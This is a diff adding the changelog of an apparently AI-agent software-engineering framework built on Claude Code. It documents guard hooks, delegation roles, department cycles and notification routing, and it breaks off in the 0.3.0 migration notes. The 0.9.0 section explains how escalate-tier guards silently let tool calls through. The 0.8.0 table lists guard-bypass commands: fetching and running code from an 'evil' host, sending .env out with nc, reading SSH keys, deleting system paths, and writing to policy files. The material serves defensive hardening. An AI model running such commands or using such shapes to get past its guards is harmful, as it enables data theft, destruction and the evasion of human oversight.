@@ -1,0 +1,1028 @@
+# Changelog
+
+Semantic versioning. A change to organizational behaviour carries a migration
+note; see [`docs/release.md`](docs/release.md).
+
+## [0.9.0] — The guards were not running
+
+Three reviews of the organization design: the SDLC loops, the agent set, and
+autonomy readiness. The first finding invalidates the security posture of every
+release before this one.
+
+### Security — the escalate tier never blocked anything
+
+`PreToolUse` hooks returned `permissionDecision: "escalate"`. Claude Code's schema
+accepts `allow`, `deny`, `ask` and `defer`; a value outside that set is discarded,
+**and a discarded decision means the tool call proceeds**.
+
+So every escalate-tier control was inert:
+
+- 25 of 45 command rules — `terraform destroy`, `git push origin main`,
+  `DROP TABLE`, production `kubectl edit`, credential rotation
+- the credential and control-plane tiers of `guard_write`
+- the lateral-spawn tier of `guard_spawn`
+- the tier-2 guard-failure handler, which is what runs when a guard breaks
+
+Verified three ways: the literal `"escalate"` appears **zero** times in the CLI
+binary; the CLI's own schema is `["allow","deny","ask","defer"]`; and a hook
+emitting each value in turn showed `deny` blocked, `ask` blocked, `escalate` **ran**.
+
+`hooks/lib/hooklib.py` now translates the organization's vocabulary to the wire
+protocol — the policy keeps the word `escalate`, the wire gets `ask`. Confirmed
+end to end: `terraform destroy` is now refused by the guard under `claude -p`.
+
+#### Why every test passed
+
+The tests asserted the guard's own output, never what the platform did with it.
+`tests/test_repository.py` now drives all three guards across both tiers and
+asserts the emitted value is one Claude Code accepts. Evaluation cases that
+pinned `"escalate"` were updated, and `run_evaluations.py` gained the
+`json_path_not_contains` check its `file_not_contains` counterpart implied.
+
+### Fixed — the delegation graph contradicted the review routing
+
+`product-manager`, `qa-lead` and `security-architect` were granted `may_spawn` in
+the registry and advertised it in their bodies, while running a tool profile with
+no `Agent` tool. The guard would have permitted a delegation the role had no way
+to attempt.
+
+The consequence was larger than three roles: **four routed reviewers were
+reachable by nobody**, and `development-lead` — which *sets* the review routing —
+could spawn 4 of the 12 reviewers the routing can require. Every routed
+specialist review fell back to the main session.
+
+New `delegating-author` profile (the author profile plus `Agent`, still without
+`Bash`, so these roles stay out of the execution path). `agent-evaluator` and
+`ai-governance` remain deliberately unspawnable — a change to this repository's
+own control plane is AP-10 work and is not delegated down a line the change could
+itself alter. That intent is now recorded on the route instead of looking like
+the same bug.
+
+### Fixed — acceptance was never machine-determined
+
+All seven cycles declared `determined_by: scripts/check_dod.py against
+acceptance.conditions`. **No such mode existed**; the string "acceptance" did not
+appear in the script. A cycle was accepted because its own lead wrote `ACCEPTED`
+into a rollup.
+
+- `check_dod.py --cycle CYCLE-DEV --project .` evaluates the acceptance
+  conditions and prints `ACCEPTED` or `NOT ACCEPTED`.
+- `--grammar` now checks cycle acceptance conditions too. A typo there previously
+  passed every validator.
+- Exit codes stopped contradicting the output: `0` all passed, `1` something
+  failed, **`3` nothing failed but evidence is missing**. A stage whose only
+  outstanding predicate was a pipeline result printed "never counted as passing"
+  and exited `0`, which any caller reads as done.
+
+### Fixed — the rework limit was a number nothing could act on
+
+`rework.limit: 3` had no transition expressing it. `CHANGES_REQUESTED` led only
+back to `IN_PROGRESS`, so an item that honestly reported a fourth round had no
+legal move but to keep cycling. The machine punished accurate reporting.
+
+Added `CHANGES_REQUESTED --limit_reached--> ESCALATED` to all seven cycles, and
+`check_cycle.py` now fails any cycle that declares a limit without such an edge.
+
+### Fixed — withdrawing a work item counted as accepting it
+
+`ESCALATED --withdrawn--> ACCEPTED` reached the terminal accepted state without
+`dod_pass`, and `check_cycle.py` explicitly whitelisted the edge from its own
+"acceptance is determined, not asserted" rule. Any over-limit item could be closed
+through it with zero predicates evaluated.
+
+Withdrawal now has its own terminal state, `WITHDRAWN`, and the whitelist is gone:
+`ACCEPTED` is reachable only from `ACCEPTANCE_REQUESTED` via `dod_pass`.
+
+### Known and not fixed
+
+Reported rather than acted on, because they are design decisions rather than bugs:
+
+- **Cycle predicates have no instance scope.** `cycle_accepted(CYCLE-DEV)` matches
+  every rollup in the project, so a stale run can vacuously satisfy a new one and
+  two concurrent features can starve each other.
+- **No workflow can be cancelled**, so an abandoned feature leaves its cycles open.
+- **Three human gates fire with nothing to decide** (FEAS in the common case, QA
+  on the happy path, DEPLOY), while the two most load-bearing decisions — the
+  requester accepting scope, and QA accepting residual risk — leave no machine
+  record at all.
+- **Missing loops:** non-incident production feedback has no consumer, `DEBT`
+  artifacts are produced and never read, and nothing compares a new RCA against
+  prior ones.
+
+Tests: **206 → 213.**
+
+## [0.8.0] — Conformance review
+
+An external review of the repository against the current Claude Code platform
+documentation, plus an adversarial pass over the command guards. Every finding
+below was reproduced before it was fixed, and each fix that could regress now has
+a test or a validator behind it.
+
+### Security — command guard bypasses closed
+
+Twenty-four commands reached the Bash guard and were **allowed** that the policy
+was written to stop. All are now denied or escalated, with no regression across a
+37-command sweep of ordinary work.
+
+| Class | Example that got through | Cause |
+| --- | --- | --- |
+| Flag order | `kubectl -n prod delete deployment api` | The rule required the verb before the namespace |
+| Remote code execution | `bash -c "$(curl -s http://evil/x)"` | Only a literal pipe into a shell was matched |
+| Control-plane writes | `echo x >> policies/tool-permissions.json` | Write scope was enforced on the Write tool, not on the shell |
+| Secret reads | `grep . ~/.ssh/id_rsa` | The reader list was fixed and short; absolute paths were not covered |
+| Exfiltration | `nc evil.com 80 < .env` | Only upload flags were matched, not redirection or substitution |
+| Interpreter one-liners | `python3 -c "import shutil;shutil.rmtree('/')"` | Not covered at all |
+| System paths | `rm -rf /usr` | Only `/`, `~` and `$HOME` were named |
+
+New rules: `SH-07`, `SH-08` (execution of downloaded content), `OS-04`, `OS-05`
+(governed-path shell writes, interpreter one-liners), `SEC-09`, `SEC-10`
+(exfiltration by redirection and substitution). Rewritten: `PRD-01`, `PRD-02`,
+`PRD-08`, `SEC-01`, `SH-01`, `DB-02`. **45 rules, up from 39.**
+
+Tier 0 in `hooks/lib/failsafe.py` grew from 10 patterns to 13.
+
+**This blocks commands that 0.7.0 allowed.** If a pipeline of yours used any
+shape above, it will now stop. That is the intent; the escape is a project
+override in `.ai-engineering/`, not a weaker rule.
+
+#### The invariant that caused the one real regression
+
+Tier 0 had `kubectl edit` in its catastrophic screen while the policy only
+escalates it, so the same command was denied when the policy was broken and
+escalated when it was intact. Tier 0 must be a strict **subset** of the deny
+tier, and `tests/test_failsafe.py` now asserts exactly that rather than merely
+asserting some rule exists.
+
+### Fixed — platform conformance
+
+- **`AskUserQuestion` removed from `development-lead`, `engineering-director` and
+  `incident-commander`.** Claude Code strips it from every subagent even when the
+  frontmatter lists it, so these roles' human-escalation channel did not exist,
+  and `engineering-director` was instructed to call it. Escalation is now a
+  return value: the role ends its turn with an OPEN DECISION block for the main
+  session to put to the human.
+- **`MultiEdit` removed** from the hook matchers, `guard_write.py` and the docs.
+  There is no such tool; the matcher alternative never fired.
+- **`SessionStart` now matches `compact` and `fork`** as well as
+  `startup|resume|clear`. After an auto-compaction the organizational context was
+  silently never re-injected.
+- **Skill paths rooted.** `skills/engineering-notifications` called
+  `python3 scripts/emit_event.py` and `./bin/aieos-notify`; a skill runs with the
+  user's project as the working directory, so neither resolved. Four other skills
+  had the same defect in prose references. `bin/` commands are invoked bare
+  because `bin/` is placed on PATH.
+- **The notification outbox moved** from `notification/outbox/` — which collided
+  with the plugin's own `notification/` directory and resolved to neither — to
+  `.ai-engineering/outbox/`, beside the event log.
+- **Six agent descriptions quoted.** An unquoted `: ` made their frontmatter
+  invalid to any strict YAML parser. Claude Code's reader tolerates it; nothing
+  else has to.
+
+### Fixed — claims that were no longer true
+
+- A teammate's **permission mode is not fixed at spawn**. Teammates start in the
+  lead's mode and individual modes can be changed afterwards; what is impossible
+  is setting per-teammate modes *at* spawn. Corrected in five places.
+- The **agent-team task list persists**. The directory under `~/.claude/tasks/`
+  survives a resume, subject to `cleanupPeriodDays`; it is the team config that is
+  removed at session end. It remains authoritative for nothing — but that is now
+  stated as the policy choice it is, rather than as a property of the storage.
+  `EVAL-AIG-005` asserted the old wording and has been corrected.
+- Counts stated in prose disagreed across four documents (29 and 30 agents, 31 and
+  32 skills, four different evaluation totals). The repository has **30 agents, 32
+  skills, 58 evaluation cases — 35 deterministic and 23 llm-judged**.
+
+### Added — enabling agent teams is a session-level decision
+
+The workflows modelled one direction of degradation: teams unavailable, fall back
+to subagent. The opposite direction was undocumented and is the more dangerous
+one. With `CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS=1` set, **any** named subagent
+spawn from the main conversation launches as a teammate — including in the 24
+stages declared `execution: subagent`. Because an idle notification carries no
+output, such a stage **stalls rather than fails**.
+
+`ai.agent_teams_available` in `project.yaml` was read by no code, which made the
+whole fallback contract unenforceable. The `SessionStart` hook now reconciles it
+against the environment and reports the mismatch in either direction.
+
+### Added — validators for the defect classes found
+
+Four findings above were mistakes a reviewer caught that no check would have.
+Each now has one:
+
+| Check | Catches |
+| --- | --- |
+| `check_skill_paths` | A plugin path in a skill without `${CLAUDE_PLUGIN_ROOT}`, or a relative `bin/` call |
+| `check_frontmatter_is_strict_yaml` | An unquoted `: ` in a frontmatter scalar |
+| `check_stated_counts` | Prose that claims a component count the repository contradicts |
+| `TestHookPolicyDocumentation` | A guard rule absent from the documented category table |
+
+`check_skill_paths` immediately found five instances the review had missed.
+
+Tests: **193 → 203**, including the 24 bypasses and the 37-command
+false-positive sweep as permanent regressions.
+
+## [0.7.0] — Production-readiness audit
+
+The architecture is frozen. This release ran the organization end to end for the
+first time and fixed what that surfaced. No new conceptual layers.
+
+### Added — end-to-end SDLC simulation
+
+`scripts/simulate_sdlc.py`: seven scenarios — feature, defect, incident,
+security-block, release-rollback, agent-change, onboarding — each run against a
+throwaway project. Real artifacts with real headers, real events, real rollups,
+and every stage's definition of done evaluated **at the moment that stage
+completes**.
+
+Evaluating at the end of a run would test the final state rather than the stage:
+`WF-DEFECT/TRIAGE` requires the defect **open** and `WF-DEFECT/VERIFY` requires
+it **closed**, and both are correct at their own moment.
+
+```
+7 scenarios · 43 stages · 173 predicates
+  → 156 pass · 0 fail · 17 require evidence outside the repository
+```
+
+`tests/test_simulation.py` fails if a workflow has no scenario, or if a
+department cycle is never completed by one.
+
+### Fixed — four defects the simulation found
+
+Each had passed static validation, because static validation checks that
+documents are well-formed, not that a process can be completed.
+
+**`required_fields_present` treated an empty list as a missing field.**
+`dependencies: []` is a positive statement that there are none. Every root
+artifact failed.
+
+**`every_linked` only looked forward.** `every_linked(REQ, ARCH)` required a
+requirement to link to an architecture that does not exist when the requirement
+is written — unsatisfiable by any author. The edge now counts in either
+direction, as `docs/knowledge-structure.md` already said it should.
+
+**`cycle_accepted` was required where the department had barely started.** SRE's
+engagement spans `EVIDENCE` → `INVESTIGATE` → `RCA`, so requiring the cycle to be
+ACCEPTED at `EVIDENCE` asked a department to have finished before it began.
+
+**A granted security exception bypassed the definition of done.** `CYCLE-SEC` had
+`RELEASE_BLOCKED --exception_granted--> ACCEPTED`. A human accepting residual risk
+is a real decision, not a reason to skip the cycle's conditions.
+
+### Changed — stages declare where they sit in a department's engagement
+
+`cycle_role: enters | continues | completes`. Only a completing stage carries
+`cycle_accepted`, `cycle_rollup_reported` and `no_open_rework`. Validation
+requires **exactly one** completing stage per workflow per cycle, and rejects a
+non-completing stage that carries them. `WF-INCIDENT/RCA` and `WF-DEFECT/FIX`
+gained the cycle declarations they were missing.
+
+### Changed — the head requests acceptance, the system determines it
+
+New `ACCEPTANCE_REQUESTED` state between `READY_FOR_INTEGRATION` and `ACCEPTED`.
+The head initiates; `scripts/check_dod.py` decides. `check_cycle.py` now fails any
+transition reaching `ACCEPTED` other than through that gate, and rejects head
+authority worded as deciding rather than requesting.
+
+Without this the machine-checkable definition of done is advisory, and the whole
+Level 2 contract reduces to an agent asserting that it finished.
+
+### Changed — the head-staffing rationale is recorded
+
+`engineering-director` heads six departments because most have one to three
+workers, so the effective chain is *organization executive → department lead →
+workers*: three levels, not four. `policies/department-cycle.json` now records
+when a dedicated department head becomes justified — more than one lead, rollup
+volume the executive cannot absorb, or an escalation path the executive should not
+sit on, as security already has — and sets a review trigger.
+
+### Added — standardised event fields
+
+Events now require `category`, `actor_type` and `correlation_id`, and carry
+`severity`, `status`, `artifact`, `stage` and `cycle` where they apply. Ten
+categories: lifecycle, task, review, quality, security, release, deployment,
+incident, governance, communication.
+
+`correlation_id` ties every event about one change together across workflows,
+which is what makes a feature thread and an audit trail reconstructable.
+
+### Added
+
+- `docs/production-readiness.md` — the audit record, including what it does not prove.
+- CI job `sdlc-simulation`; `check_all.sh` runs it too.
+- 193 tests, up from 184.
+
+---
+
+### Migration: 0.6.0 → 0.7.0
+
+**Breaking: a stage declaring `department_cycle` must declare `cycle_role`.**
+Project-local workflows need it added. Only the completing stage keeps the three
+cycle predicates; a non-completing stage carrying them is now an error.
+
+**Breaking: cycles gain `ACCEPTANCE_REQUESTED`.** `READY_FOR_INTEGRATION` now
+transitions to it rather than straight to `ACCEPTED`, and `acceptance` requires
+`requested_by` and `determined_by`.
+
+**Breaking: events require `category`, `actor_type` and `correlation_id`.**
+`scripts/emit_event.py` fills the first two from the catalogue and defaults
+`correlation_id` to the subject, so most callers need no change.
+
+**Behaviour change: two predicates became satisfiable.** `required_fields_present`
+no longer fails on empty lists; `every_linked` accepts either direction. Stages
+that previously failed may now pass — correctly.
+
+## [0.6.0] — Engineering communications
+
+
+A third platform capability alongside SDLC and governance. Event-driven, not a
+generic agent bolted on: the SDLC emits structured events, a deterministic policy
+routes them, an agent formats them, and a separate credentialed act sends.
+
+### Added — the event layer
+
+`notification/event-catalogue.json`: **41 event types**, each declaring its level,
+what emits it, and its payload fields. Stages now declare `emits:`, and validation
+checks **both directions** — a catalogue entry claiming a stage emits it, where
+the stage does not, is an error. 22 stages emit.
+
+`scripts/emit_event.py` appends to an append-only log at
+`.ai-engineering/events/*.jsonl`. An unknown event type is refused: an event
+nothing declares cannot be routed.
+
+### Added — deterministic routing
+
+`scripts/route_event.py` and `notification/notification-policy.json`: **41 rules**
+answering should anyone be notified, who, which channel, which thread, how
+urgently. **No model is involved.** The agent receives the decision; it cannot
+change it, and it cannot decide that nothing is sent.
+
+Levels mirror the SDLC hierarchy, so Level 2 rollups do the work:
+
+| Level | Notify |
+| --- | --- |
+| worker | **never** — recorded, not pushed |
+| team | immediate |
+| department | aggregate |
+| organization | immediate |
+| incident | immediate |
+
+Ten workers on one feature produce **one** update, not thirty. Duplicate
+suppression inside a 60-minute window; aggregation emits only when the aggregate
+state has meaningfully changed.
+
+### Added — channels with admission rules
+
+Seven spaces, each declaring which event levels it accepts. Routing a lower level
+into a channel is a **validation error**, not a judgement call. The `incidents`
+space accepts incident-level only (plus `RCA_COMPLETED`, which closes its own
+thread), because a space that receives routine traffic stops being read at 03:00.
+
+**No webhook URLs in the repository.** Each channel names the environment
+variable holding its URL. A Google Chat incoming webhook is a bearer credential.
+
+### Added — one thread per feature
+
+The thread key is the subject id, so a feature's whole timeline lives in one
+thread: requirements approved, decision opened, architecture approved, stories
+created, development rollups, defects, release, deployment.
+
+### Added — formatting separated from sending
+
+- `agents/notification-agent.md` (30th agent) — **formats only**. No `Bash`, so it
+  cannot send. Write scope limited to `notification/outbox/`.
+- `bin/aieos-notify` — dispatch. **Dry run by default**; `--send` is deliberate.
+  The webhook is read from the environment and never printed, logged or stored.
+- `skills/engineering-notifications/SKILL.md`.
+
+### Added — digests
+
+`scripts/notify_digest.py` builds daily and weekly summaries from the event log.
+Counts are computed, never recalled. The weekly **trends** section reports changes
+in shape: rework rising, reopen rate rising, the same RCA cause twice, a `DEC`
+open longer than a week.
+
+### Added — validation and tests
+
+- Four registry invariants: `notification_agent_cannot_send`,
+  `worker_events_are_never_notified`, `notification_routing_is_complete`,
+  `no_webhook_urls_in_the_repository`.
+- Three evaluation cases including an adversarial LLM-judged one: a request for
+  "enough detail that people can tell whether they are affected" on a critical
+  finding, which must be refused rather than partially complied with.
+- 21 notification tests. 184 total.
+
+### Changed — the freeze, exercised once
+
+`notification-agent` is the 30th agent, and the four-part unfreeze test is applied
+in the open in `docs/organization-freeze.md`. The deciding point was the fourth:
+giving the organization's outbound voice to `docs-writer` would mean one mistake
+reaches everyone and cannot be recalled.
+
+### Fixed
+
+- `notification-agent` was first defaulted to `haiku` because filling a template
+  is mechanical. The model-floor test rejected it: a MEDIUM-risk role publishing
+  outside the organization cannot sit below `sonnet`, because a leaked secret is
+  unrecoverable. Raised.
+- Channel admission was implicit; a test caught `DEPLOYMENT_FAILED` and
+  `INCIDENT_RESOLVED` routing to announcements. Rather than bending the rule,
+  announcements was widened deliberately and the reason recorded.
+
+---
+
+### Migration: 0.5.0 → 0.6.0
+
+**Additive.** Nothing existing changes behaviour. A project that sets no webhook
+environment variables emits and routes events but sends nothing, and every
+dispatch is a dry run.
+
+**To turn it on:** create the Chat spaces, set the `AIEOS_CHAT_WEBHOOK_*`
+variables as masked, protected CI variables, and run `bin/aieos-notify --send`
+from the pipeline. Never commit a URL.
+
+**Not shipped, deliberately:** anything interactive. `@bot status FEAT-103` needs
+a real Google Chat app handling interaction events, not an incoming webhook. And
+approval stays in GitLab — a chat message must never become production
+authorization.
+
+## [0.5.0] — The human governs, an agent manages
+
+
+v0.4.0 made every department head a named human. That put a person in the middle
+of every departmental rollup, which contradicts the autonomy target. Corrected.
+
+### Changed — five positions, not four
+
+```
+HUMAN OWNER    governance only: the approval categories that name this role,
+     │         plus anything the head escalates. Not routine rollups.
+     ▼
+HEAD (agent)   plans, delegates, receives the rollup, decides whether done
+     ▼
+LEAD (agent)   decomposes, assigns, produces the rollup
+     ▼
+WORKER (agent) executes and self-validates
+     ▼
+PEER (agent)   reviews detail, independent, cannot write the artifact
+```
+
+`engineering-director` heads six of seven departments. Not a convenience: its
+role contract already covers sequencing and cross-department arbitration, and it
+already holds the spawn authority for every cycle lead. **No new agents** — the
+set stays frozen at 29.
+
+Validation now fails a head that cannot spawn its own lead. A manager that cannot
+delegate is not a manager.
+
+### Changed — one argued exception
+
+`CYCLE-SEC` keeps a human head. Placing the delivery-accountable agent above
+security would put schedule pressure in security's reporting line, which is the
+one thing security's independence exists to prevent. At most one such exception
+is permitted, and it must state why.
+
+### Added — human owners with specific authority
+
+Each cycle names its `human_owner` and **what that human actually decides**:
+
+| Cycle | Human owner | Authority |
+| --- | --- | --- |
+| `CYCLE-PROD` | project-owner | Requirement scope; AP-03 |
+| `CYCLE-ARCH` | architecture-owner | AP-02, AP-03, AP-06 |
+| `CYCLE-QA` | qa-owner | Residual risk where exit criteria are waived |
+| `CYCLE-DEV` | engineering-owner | AP-09; scope beyond approved stories |
+| `CYCLE-SEC` | security-owner | AP-04, AP-08; release blocks |
+| `CYCLE-DEVOPS` | engineering-owner | AP-07, AP-01 |
+| `CYCLE-SRE` | on-call-owner | AP-01 production actions; AP-11 data access |
+
+`authority` is required and validated. A governance role that decides nothing
+specific decides everything by default.
+
+### Changed — escalation reaches the human last
+
+`worker → peer_reviewer → lead → head → human_owner`, in that order. A worker
+never escalates straight to the head; the head reaches the human only for
+governance or for what the department cannot resolve.
+
+### Changed — incident investigation is unconditionally TEAM_REQUIRED
+
+Stated explicitly for the security-compromise case: a novel incident and a
+suspected compromise both run through `INVESTIGATE`, and one agent producing four
+viewpoints is not four independent agents. A fourth guarantee was added to the
+degraded mode — a single investigator is also a single point of failure for
+noticing that the evidence itself has been tampered with.
+
+### Added
+
+- Three registry invariants: `departments_are_run_by_agents`,
+  `escalation_reaches_the_human_last`, `incident_investigation_requires_a_team`.
+- Two evaluation cases: `EVAL-GOV-008`, `EVAL-SRE-006`. 55 cases, 33 deterministic.
+- 163 tests, up from 159.
+
+### Fixed
+
+- A refactor of `check_cycle.py` dropped the peer-reviewer independence checks.
+  Restored, with a negative test that a head with the wrong profile, a head that
+  cannot spawn its lead, and a human owner that is an agent are all rejected.
+
+---
+
+### Migration: 0.4.0 → 0.5.0
+
+**Breaking: cycle `positions` requires `human_owner`.** Every cycle must name the
+human role and what it decides.
+
+**Breaking: `head` is now an object** with `kind` (`agent` or `human`) and
+`role`. A `human` head additionally requires `human_exception_reason`.
+
+**Breaking: `escalation.order` must end with `human_owner`**, not `head`.
+
+**Behaviour change: rollups go to an agent, not a person.** If your process
+routed departmental rollups to a human inbox, that human now receives only
+escalations and approval requests. The head decides whether the department is
+done.
+
+## [0.4.0] — Department execution cycles (Level 2)
+
+
+The macro workflows govern stage-to-stage progression. This release adds the
+delegation, review and rework loop that runs **inside** each stage. It is added
+underneath the existing workflows, not in place of them.
+
+**No new agents.** The set stays frozen at 29. The cycle is defined in terms of
+*positions* — head, lead, worker, peer reviewer, specialist reviewer — filled by
+existing agents and by the named humans in the project's `approval:` section.
+
+### Added — the generic cycle
+
+`policies/department-cycle.json` and `schemas/department-cycle.schema.json`.
+
+```
+head → lead → worker → self-check → peer review → lead review
+     → rework → acceptance → rollup
+```
+
+Ten states, with `CHANGES_REQUESTED` returning to `IN_PROGRESS`, `ESCALATED` for
+what the department cannot resolve, and `BLOCKED` for what it is waiting on.
+`ACCEPTED` requires **every** item in the set to reach `READY_FOR_INTEGRATION`;
+one accepted item does not accept the set.
+
+### Added — seven department cycles
+
+`sdlc/cycles/`: development, QA, security, architecture, product, platform, SRE.
+
+| Cycle | Head (human) | Lead | Workers | Peer reviewer |
+| --- | --- | --- | --- | --- |
+| `CYCLE-DEV` | engineering-owner | `development-lead` | backend, frontend, data | `code-reviewer` |
+| `CYCLE-QA` | qa-owner | `qa-lead` | `qa-engineer` | `test-reviewer` |
+| `CYCLE-SEC` | security-owner | `security-architect` | `security-reviewer`, `dependency-reviewer` | mutual |
+| `CYCLE-ARCH` | architecture-owner | `solution-architect` | `solution-architect` | `architecture-reviewer` |
+| `CYCLE-PROD` | project-owner | `product-manager` | `requirements-analyst` | `qa-lead` |
+| `CYCLE-DEVOPS` | engineering-owner | `devops-engineer` | `devops-engineer` | `reliability-reviewer` |
+| `CYCLE-SRE` | on-call-owner | `sre` | `sre` | `reliability-reviewer` |
+
+### Added — the join to the macro workflow
+
+Stages gain `department_cycle`, and their definition of done gains
+`cycle_accepted()`, `cycle_rollup_reported()` and `no_open_rework()`. **A macro
+stage cannot complete while its department's loop is escalated or in rework.**
+19 stages across the seven workflows are wired.
+
+### Added — the peer review tier
+
+A read-only reviewer sits between worker and lead. Minor findings go straight
+back to the worker and never reach the lead; the lead reviews adherence and
+integration rather than line-level detail; the head reads a rollup.
+
+The enforced constraint is that the peer reviewer **cannot write the artifact it
+reviews** — not merely that it holds no write tools, which was too coarse and
+wrongly flagged `qa-lead` reviewing requirements for testability.
+
+### Added — QA defect triage
+
+A sub-cycle: a tester observing a failure does not create a development defect.
+`qa-lead` validates first, through five questions, and routes to one of
+`not-a-defect`, `test-defect`, `environment-defect`, `requirement-ambiguity` or
+`product-defect`. Only the last becomes a `DEF` and enters `WF-DEFECT`.
+
+### Added — bounded rework and an escalation tree
+
+Rework limit **3**, then escalate. A third round means the acceptance criteria,
+the design or an unwritten disagreement is the real problem.
+
+Escalation runs worker → peer reviewer → lead → head, and **never skips the
+lead**: an escalation that reached the head without the lead knowing means the
+lead was not told about a problem in its own department. Lateral escalation
+routes architecture, requirement, security, environment and operational issues
+out of the department.
+
+### Added — the rollup
+
+Produced by the lead on `ACCEPTED` or on any escalation leaving the department,
+recorded in the work-item set artifact's new `rollup:` block. Per-stream verdicts,
+aggregate finding counts, total rework rounds, escalations, artifacts, next gate.
+The head reads that and never an individual review round.
+
+### Added — tooling
+
+- `scripts/check_cycle.py`: state-machine analysis (reachability, dead ends,
+  terminal reachability, both reviews able to request changes), position checks
+  and two-way wiring checks. Plus `--graph` and `--trace`, which walk a happy
+  path and a rework path through any cycle.
+- Six registry invariants and three evaluation cases: `EVAL-ENG-004`,
+  `EVAL-GOV-007`, `EVAL-QA-004`. 53 cases, 31 deterministic.
+- 159 tests, up from 147. CI job extended.
+- `docs/department-cycles.md`, `templates/artifacts/rollup.md`.
+
+### Fixed
+
+- `WF-FEATURE/ARCH` was claimed by two cycles. A stage runs exactly one; security
+  participates in architecture as a specialist reviewer inside `CYCLE-ARCH`.
+- The peer-review independence check was too coarse, as above.
+
+---
+
+### Migration: 0.3.0 → 0.4.0
+
+**Additive for macro workflows.** Existing stages without a `department_cycle`
+keep working unchanged.
+
+**Stages that gained a cycle gained three DoD predicates.** A project tracking
+stage completion must now record a `rollup:` block on the work-item set artifact.
+Without it, `cycle_rollup_reported()` fails and the stage does not complete.
+
+**New optional artifact field: `rollup`.** Only required on the work-item set
+artifact of a stage that runs a cycle.
+
+**Project configuration must name the human roles the cycles reference**:
+`engineering_owner`, `qa_owner`, `security_owner`, `architecture_owner`,
+`project_owner`, `on_call_owner`. These were already in the 0.3.0 `approval:`
+section; the cycles now read them.
+
+**Not added, deliberately:** Backend Lead, Frontend Lead, Data Lead, Senior
+Developer, Development Head, QA Head, QA Architect. Each is a *position* in the
+cycle rather than a role, and the reasoning is in
+[`docs/organization-freeze.md`](docs/organization-freeze.md). If your
+organization needs them as distinct agents, that is an `agent-architect` ADR and
+a council decision, not a silent addition.
+
+## [0.3.0] — Architecture frozen
+
+
+Schema hardening and implementation correctness. **No new agents**: the set is
+frozen at 29, and the four-part test for unfreezing is in
+[`docs/organization-freeze.md`](docs/organization-freeze.md).
+
+### Added — full artifact contracts
+
+`policies/artifact-model.json` v2. Every one of 21 types now declares who
+**creates** it, who **may modify** it, who **may review** it, which **human** may
+approve it, where it is **stored**, its **required fields**, what it
+**depends on** and what **consumes** it.
+
+Two new first-class artifacts:
+
+- **`DEC` open decision** — the question, options with what each forecloses, the
+  impact, the owner, and `blocks: [ARCH, ADR]`. An agent blocked by one names it
+  once and stops, instead of re-asking every session.
+- **`EVID` evidence** — logs, timestamps, deployment versions, configuration
+  snapshots, metrics, traces and the investigation commands. Immutable
+  (`may_modify: []`), collected and sealed **before** any destructive remediation.
+
+`INC` is now `append_only` rather than immutable: the commander adds timeline
+entries during an incident and nothing is rewritten afterwards.
+
+### Added — evidence preservation as a stage
+
+`WF-INCIDENT` gains `EVIDENCE`, between `TRIAGE` and `INVESTIGATE`. `MITIGATE`
+cannot complete without `evidence_sealed()`. For a suspected security compromise
+the stage is mandatory and blocking.
+
+### Changed — agent gates state what they check
+
+Every `agent_gate` now requires a `purpose` naming the dimension: *testability*,
+*feasibility completeness*, *requirement coverage and non-functional fitness*,
+*coverage and evidence quality*. Validation rejects a purpose that begins with
+"approve", "sign off" or "accept" — that would be an approval, which an agent may
+not give.
+
+### Changed — release approval, authorization and execution are three acts
+
+`policies/release-authority.json`, and a new `AUTHORIZE` stage in both deploying
+workflows. The release state machine is now
+`draft → in-review → approved → authorized → done | rolled-back`.
+
+In 0.2.0 approval and authorization were one act, so a release approved on Monday
+carried standing permission to deploy on Friday against a changed production.
+
+### Added — human identity is structural
+
+`approvals` entries now require `id`, `approver_id`, `approver_role`, `at`,
+`recorded_in` and `decision`. `approver_role` must name a human role; validation
+rejects an agent name. `.ai-engineering/project.yaml` gains a required `approval:`
+section naming the human behind each authority — a category with no named human
+cannot be satisfied.
+
+### Added — team requirement levels
+
+`TEAM_REQUIRED` / `TEAM_PREFERRED` / `TEAM_OPTIONAL`, each with a
+`degraded_mode` stating what is genuinely lost without a team. Falling back
+silently would pretend a subagent is equivalent.
+
+`WF-INCIDENT INVESTIGATE` is `TEAM_REQUIRED` and falls back to **escalate**.
+`WF-FEATURE ARCH` and `WF-RELEASE STAGING` are PREFERRED; `WF-FEATURE DEV` is
+OPTIONAL.
+
+### Added — coupled surfaces
+
+`policies/coupling-policy.json`. File disjointness is necessary and not
+sufficient: a backend agent and a frontend agent editing different files both
+change the API contract. Five surfaces — api-contract, database-schema,
+deployment-manifest, event-schema, shared-configuration — each with one owning
+role. Stages declare what they touch; validation fails when two parallel stages
+share one.
+
+### Added — six high-risk command rules, and structural enforcement
+
+`SEC-08` (chmod on credential material), `PRD-08` (in-place production config
+edit), `PRD-09` (production service stop/restart), `CLD-01` (cloud resource
+deletion across AWS/GCP/Azure), `CLD-02` (credential creation and rotation),
+`REG-01` (container image deletion). 39 rules total.
+
+`hook-policy.json` gains a `structural_enforcement` section naming the boundaries
+that belong in tool profiles and permission deny rules rather than in a regex.
+`templates/project/settings.json` ships 18 structural deny rules.
+
+### Added — stage-local definitions of done
+
+Stage DoD is now primary, with `required_fields_present`, `artifact_owned_by`,
+`no_open_blocking_decisions_for`, `decision_resolved`, `evidence_sealed`,
+`release_authorized` and `human_identity_recorded` joining the predicate set.
+21 predicates, 212 instances across seven workflows, all evaluable.
+
+### Added
+
+- `docs/organization-freeze.md`.
+- Six registry invariants and four evaluation cases: `EVAL-GOV-006`,
+  `EVAL-REL-004`, `EVAL-SRE-005`, `EVAL-ENG-003`. 50 cases, 28 deterministic.
+- 147 tests, up from 132.
+- Templates: `open-decision.md`, `evidence.md`.
+
+### Fixed
+
+- The agent-gate purpose check first flagged four legitimate purposes containing
+  "the approved stack". It now checks how the purpose **starts**, which is the
+  signal that matters.
+- `development-lead` owned `DEBT` but its write scope excluded
+  `docs/technical-debt/` — found by the new contract-versus-scope check.
+- `INC` was marked immutable while listing a modifier, which would have forbidden
+  the commander adding timeline entries.
+
+---
+
+### Migration: 0.2.0 → 0.3.0
+
+**Breaking: `agent_gate` requires `purpose`.** Add the dimension each reviewer
+checks. A purpose starting with "approve" is rejected.
+
+**Breaking: `.ai-engineering/project.yaml` requires `approval:` and
+`observability:`.** Name the human behind each authority. A project without a
+named `release_approver` cannot satisfy AP-01, and validation now says so.
+
+**Breaking: `approvals` entries require `id`, `approver_id` and
+`approver_role`.** Existing approvals need the identity added.
+`approver_role` naming an agent is now an error.
+
+**Breaking: deployment requires an `authorized` release.** Both deploying
